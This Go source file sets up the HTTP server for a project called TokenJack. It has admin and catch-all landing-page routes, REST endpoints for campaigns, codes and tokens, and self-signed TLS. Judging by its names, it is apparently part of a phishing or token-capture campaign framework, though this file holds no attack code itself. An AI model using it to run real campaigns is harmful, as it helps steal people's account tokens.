package server

import (
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"fmt"
	"math/big"
	"net/http"
	"time"

	"github.com/go-chi/chi"
	"github.com/z3vxo/TokenJack/internal/api/campaign"
	"github.com/z3vxo/TokenJack/internal/api/code"
	"github.com/z3vxo/TokenJack/internal/api/event"
	"github.com/z3vxo/TokenJack/internal/api/site"
	"github.com/z3vxo/TokenJack/internal/api/tokens"
	"github.com/z3vxo/TokenJack/internal/api/user"
	"github.com/z3vxo/TokenJack/internal/auth"
	"github.com/z3vxo/TokenJack/internal/codes"
	"github.com/z3vxo/TokenJack/internal/config"
	"github.com/z3vxo/TokenJack/internal/db"
	"github.com/z3vxo/TokenJack/internal/events"
)

type Server struct {
	DB     *db.DB
	Cfg    *config.Config
	Auth   *auth.Auth
	Codes  *codes.Codes
	Events *events.Hub

	user     *user.Handler
	campaign *campaign.Handler
	code     *code.Handler
	event    *event.Handler
	site     *site.Handler
	tokens   *tokens.Handler
}

func New() (*Server, error) {
	db, err := db.New()
	if err != nil {
		return nil, err
	}
	c, err := config.Get()
	if err != nil {
		return nil, err
	}

	authn := auth.New([]byte(c.Auth.AccessSecret), []byte(c.Auth.RefreshSecret), c.Auth.AccessTTL, c.Auth.RefreshTTL)
	hub := events.New()
	codesSvc := codes.New(db, hub)

	return &Server{
		DB:     db,
		Cfg:    c,
		Auth:   authn,
		Codes:  codesSvc,
		Events: hub,

		user:     user.New(db, authn),
		campaign: campaign.New(db, authn),
		code:     code.New(db, codesSvc),
		event:    event.New(authn, hub),
		site:     site.New(db),
		tokens:   tokens.New(db, authn),
	}, nil
}

func (s *Server) SetupRouter() chi.Router {
	r := chi.NewRouter()

	r.Get("/admin", s.site.Admin)
	r.Get("/admin/*", s.site.Admin)
	r.Get("/{path}", s.site.LandingPage)
	r.Get("/{path}/*", s.site.LandingMisc)

	r.Route("/rest", func(r chi.Router) {
		r.Mount("/user", s.user.Routes())
		r.Mount("/campaign", s.campaign.Routes())
		r.Mount("/code", s.code.Routes())
		r.Mount("/events", s.event.Routes())
		r.Mount("/tokens", s.tokens.Routes())
	})

	return r
}

func (s *Server) Run() error {
	r := s.SetupRouter()

	listenAddr := fmt.Sprintf("%s:%d", s.Cfg.Server.Bind, s.Cfg.Server.Port)

	srv := &http.Server{
		Addr:    listenAddr,
		Handler: r,
	}

	if !s.Cfg.TLS.Enabled {
		fmt.Printf("[*] Listening on http://%s\n", listenAddr)
		return srv.ListenAndServe()
	}

	if s.Cfg.TLS.CertFile != "" && s.Cfg.TLS.KeyFile != "" {
		return srv.ListenAndServeTLS(s.Cfg.TLS.CertFile, s.Cfg.TLS.KeyFile)
	}

	cert, err := s.GenSelfSigned()
	if err != nil {
		return err
	}
	srv.TLSConfig = &tls.Config{
		Certificates: []tls.Certificate{cert},
	}
	fmt.Printf("[*] Listening on https://%s\n", listenAddr)
	return srv.ListenAndServeTLS("", "")
}

func (s *Server) GenSelfSigned() (tls.Certificate, error) {
	key, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return tls.Certificate{}, err
	}
	template := x509.Certificate{
		SerialNumber: big.NewInt(1),
		Subject: pkix.Name{
			CommonName: "TokenJacker",
		},
		NotBefore: time.Now(),
		NotAfter:  time.Now().Add(365 * 24 * time.Hour),
		KeyUsage:  x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage: []x509.ExtKeyUsage{
			x509.ExtKeyUsageServerAuth,
		},
		DNSNames: []string{
			s.Cfg.TLS.Hostname,
		},
	}
	certDER, err := x509.CreateCertificate(
		rand.Reader, &template, &template, &key.PublicKey, key,
	)
	if err != nil {
		return tls.Certificate{}, err
	}
	return tls.Certificate{
		Certificate: [][]byte{certDER},
		PrivateKey:  key,
	}, nil
}
